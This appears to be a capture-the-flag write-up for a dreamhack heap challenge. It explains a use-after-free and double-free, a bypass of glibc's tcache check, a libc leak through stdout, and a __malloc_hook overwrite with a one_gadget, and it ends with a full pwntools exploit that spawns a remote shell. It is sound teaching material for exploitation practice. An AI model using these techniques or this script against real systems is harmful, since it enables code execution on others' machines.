# dreamhack.io: tcache_poison

A heap challenge with four menu options — Allocate, Free, Print, Edit — and a single global chunk pointer. No index, no multi-chunk bookkeeping. Everything has to go through that one pointer.

## 1. Files and protections

We're given the binary, its source, and `libc-2.27.so`.

```
$ checksec ./tcache_poison
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Full RELRO means the GOT is read-only after startup, so overwriting it is out. No PIE means the binary's own code/data addresses are fixed every run, which ends up mattering a lot later.

## 2. The vulnerability

```c
void *chunk = NULL;
// ...
case 1: // Allocate
    chunk = malloc(size);
    read(0, chunk, size - 1);
    break;
case 2: // Free
    free(chunk);              // no NULL-out afterward
    break;
case 3: // Print
    printf("Content: %s", chunk);  // reads freed memory
    break;
case 4: // Edit
    read(0, chunk, size - 1);      // writes freed memory
    break;
```

`free(chunk)` never resets `chunk` to NULL, so `Print`/`Edit` still work on it afterward — a Use-After-Free. Nothing tracks whether the chunk is already freed either, so calling `Free` twice in a row frees the same chunk twice. That's the whole bug set, and it's enough.

(There's also an integer underflow — `size` is `unsigned int`, so `size = 0` makes `size - 1` wrap to `0xFFFFFFFF`, turning `read()` into an effectively unbounded write. Didn't need it for this solve.)

## 3. Designing the attack

GOT is read-only, so the usual target is `__malloc_hook` — glibc calls it right before running the real `malloc()`, if it's set. Get an address into it and the next `malloc()` call runs whatever we put there instead.

Problem: `__malloc_hook` is inside libc, and libc's base address is randomized every run. So we need a leak before we can compute where it actually is. And the only read primitive here is `Print`, which reads from whatever the single pointer currently holds — so the leak has to come from making `malloc()` itself return the address of something worth reading, not from reading inside a chunk we already control.

That's really the whole exploit: get `malloc()` to return an address we choose, and use that same trick twice — once to leak, once to hijack. Double free plus UAF is what produces that primitive (usually called tcache poisoning): corrupt a freed chunk's internal next-pointer, and the allocator hands that address straight back out on the next allocation of that size, no matter what's actually there.

So: build the double-free primitive once, point it at something with a known libc pointer inside it to get `libc_base`, then point the same primitive at `__malloc_hook` and write a one_gadget address there.

## 4. Tcache double-free

glibc caches small frees (roughly 24–1032 bytes) in `tcache` instead of returning them to the OS right away. Each size class is a linked list capped at 7 entries, and each freed chunk stores a `next` pointer in the first 8 bytes of its own (now unused) data.

Ubuntu's glibc 2.27 has the tcache double-free check backported (upstream 2.27 doesn't), so freeing the same chunk twice just aborts:

```
free(): double free detected in tcache 2
```

The check works by storing "which tcache owns this chunk" in a second 8-byte field (`key`), right after `next`, and comparing it against the live tcache pointer on every free. Since we can write into freed memory via the UAF, we can zero that field out between the two frees and get past the check — it only looks at `key`.

```
① free(A) once           tcache = [A],    A.next = NULL, A.key = tcache
② UAF-write A.key = 0     A.key = 0                                  <- check bypassed
③ free(A) again           tcache = [A, A], A.next = A (self), A.key restored
④ UAF-write A.next = TARGET
⑤ Allocate → pops A (reusable)
⑥ Allocate → pops TARGET  ← malloc() now returns whatever we chose
```

```python
def double_free_poison(io, size, target):
    alloc(io, size, b'A' * 8)
    free(io)
    edit(io, p64(0) * 2)          # next = 0, key = 0 -> bypasses the check
    free(io)                      # real double free, self-loop
    edit(io, p64(target))         # A.next = target
```

That function is the whole exploit primitive. Everything after this is calling it twice with two different targets, plus two Allocates each time to pop `A` and then `TARGET` off the list.

## 5. Leaking libc through stdin/stdout

`stdin` and `stdout` are global `FILE *` pointers. PIE is off, so their addresses are fixed:

| symbol | address | holds |
| --- | --- | --- |
| `stdout` | `0x601010` | pointer to `_IO_2_1_stdout_` in libc |
| `stdin`  | `0x601020` | pointer to `_IO_2_1_stdin_` in libc |

We know where these variables live. We don't know the libc address stored inside them, which is exactly what we want. Point the poisoning at one of them and `Print` it.

Tried `stdin` first and got nothing. `Print` is `printf("%s", chunk)`, so it stops at the first null byte, and `_IO_2_1_stdin_`'s offset inside libc happens to end in `0x00` — any pointer built from `libc_base + that offset` has a zero low byte, so the leak always stops before printing anything useful, regardless of ASLR. `_IO_2_1_stdout_`'s offset ends in `0x60` instead, so switching to `stdout` worked immediately:

```
Content: Z`\xb7\\\xff\xff\x7f1. Allocate...
# 'Z' is filler, the rest is stdout's real libc pointer, little-endian
```

The target is `stdout - 1` (`0x60100F`), not `stdout` itself. Two reasons: `Allocate` always writes at least one byte right after `malloc()` returns, so targeting `stdout` directly would clobber the live pointer before we ever read it and crash the next print. Landing one byte before it means the write lands somewhere harmless, and `Print`'s read (which doesn't stop at chunk boundaries, just walks memory for `%s`) passes straight through the real 8 bytes right after it.

```python
leaked = u64(raw[1:].ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['_IO_2_1_stdout_']
```

One more thing: the leak stage and the `__malloc_hook` stage use two different tcache size classes (`0x30` vs `0x80`). Reusing the same bin for both left the allocator in a state where the next `malloc()` calls would segfault — most likely because the same patch that added the `key` field also clears it on pop, not just on free, so popping a poisoned chunk near stdin/stdout zeroes a few bytes past the target that the next allocation then trips on. Using a separate bin for the second cycle avoided it.

## 6. Overwriting __malloc_hook and finding a one_gadget

With `libc_base` known, `__malloc_hook`'s real address is one addition away:

```python
malloc_hook = libc_base + libc.symbols['__malloc_hook']
```

Run `double_free_poison()` again, different size class, and write a one_gadget address into the chunk `malloc()` hands back:

```python
double_free_poison(io, SZ_HOOK, malloc_hook)
alloc(io, SZ_HOOK, b'C' * 8)                     # pop A back
alloc(io, SZ_HOOK, p64(libc_base + one_gadget))  # pop malloc_hook, write the gadget
```

`__malloc_hook` is a function pointer — whatever's written there gets called the next time `malloc()` runs, with `malloc()`'s own arguments and stack. We don't get to control registers or the stack the way a normal shellcode payload would assume. What we do get is one precise jump into code that's already there, already executable, already part of libc — so there's no need for a ROP chain or an NX bypass, we're not injecting anything new.

A one_gadget is a spot inside libc where the existing instructions call `execve("/bin/sh", ...)` on their own, if the CPU state at that exact moment happens to satisfy a few conditions. These spots exist because glibc internally builds and calls shell-spawning code in a few places (`popen` and similar), and jumping into the middle of that with the right memory layout just runs it through to the syscall. `one_gadget` is a Ruby tool that scans a libc file and finds them:

```
$ gem install one_gadget
$ one_gadget libc-2.27.so
0x4f3ce execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv

0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```

Each entry is an offset from `libc_base`, what it does (always `execve("/bin/sh", ...)` here), and what has to be true when execution lands there. None of that is something we control — it depends on whatever the register/stack state happens to be at the moment `__malloc_hook` fires, which we can't inspect from outside without a debugger attached at exactly that point. So in practice you just try candidates and see what survives.

`rsp & 0xf == 0` means the stack pointer needs 16-byte alignment, because some of these gadgets use SSE instructions that fault otherwise. `address X is writable` means the gadget uses that stack slot as scratch space for building the argv it passes to `execve`, so it needs to be mapped. The register-based constraints (`rcx == NULL || ...`) are the strict ones — a specific register has to already be NULL or already point at a valid argv array, and registers at a random point deep in libc's call machinery are unpredictable. The stack-based ones (`[rsp+0x70] == NULL || ...`) are looser, because stack memory further from the current frame is more often still zeroed out from earlier in the process's life, so landing on NULL there happens more often even with zero control over it.

Here, the first three candidates all crashed — one `SIGSEGV`, one `SIGILL`, meaning execution did land inside the gadget but hit an instruction that didn't make sense for whatever was actually in those registers. The fourth, `0x10a41c`, worked. Not really luck specific to this binary — when you don't know the runtime state, starting with the candidate that depends on stack content instead of a specific register is usually the better bet.

Also worth noting: `one_gadget` has to run against the exact libc file that's actually loaded at runtime. These offsets are tied to the specific byte layout of that build — even a small patch bump shifts everything.

## 7. Full exploit

```python
from pwn import *
import time

context.arch = 'amd64'
HOST, PORT = 'host3.dreamhack.games', 14741
libc = ELF('./libc-2.27.so')

SZ_LEAK = 0x30
SZ_HOOK = 0x80                    # a different bin than the leak stage, deliberately
LEAK_TARGET = 0x601010 - 1        # stdout - 1
ONE_GADGETS = [0x10a41c, 0x4f3ce, 0x4f3d5, 0x4f432]  # loosest constraint first

def alloc(io, size, data=b''):
    io.sendlineafter(b'4. Edit\n', b'1')
    io.sendlineafter(b'Size: ', str(size).encode())
    io.sendafter(b'Content: ', data)

def free(io):
    io.sendlineafter(b'4. Edit\n', b'2')

def show(io):
    io.sendlineafter(b'4. Edit\n', b'3')

def edit(io, data):
    io.sendlineafter(b'4. Edit\n', b'4')
    io.sendafter(b'Edit chunk: ', data)

def double_free_poison(io, size, target):
    alloc(io, size, b'A' * 8)
    free(io)
    edit(io, p64(0) * 2)          # bypass the double-free check
    free(io)
    edit(io, p64(target))         # A.next = target

io = remote(HOST, PORT)

# --- leak libc via stdout ---
double_free_poison(io, SZ_LEAK, LEAK_TARGET)
alloc(io, SZ_LEAK, b'B' * 8)
alloc(io, SZ_LEAK, b'Z')
show(io)

io.recvuntil(b'Content: ')
raw = io.recvuntil(b'1. Allocate', drop=True)
leaked = u64(raw[1:].ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['_IO_2_1_stdout_']
malloc_hook = libc_base + libc.symbols['__malloc_hook']
target_addr = libc_base + ONE_GADGETS[0]
log.success(f'libc base = {hex(libc_base)}')

# --- overwrite __malloc_hook ---
double_free_poison(io, SZ_HOOK, malloc_hook)
alloc(io, SZ_HOOK, b'C' * 8)
alloc(io, SZ_HOOK, p64(target_addr))

# --- trigger malloc() -> hook -> shell ---
io.sendlineafter(b'4. Edit\n', b'1')
io.sendlineafter(b'Size: ', b'16')
time.sleep(0.3)
io.clean(timeout=0.5)

io.interactive()
```

## 8. Result

```
$ nc host3.dreamhack.games 14741
[+] libc_base = 0x7f4ffb2b3000
uid=1000(tcache_poison) gid=1000(tcache_poison) groups=1000(tcache_poison)
$ cat flag
DH{...}
```

(Flag redacted — same for every solver, so leaving it out of a public write-up.)
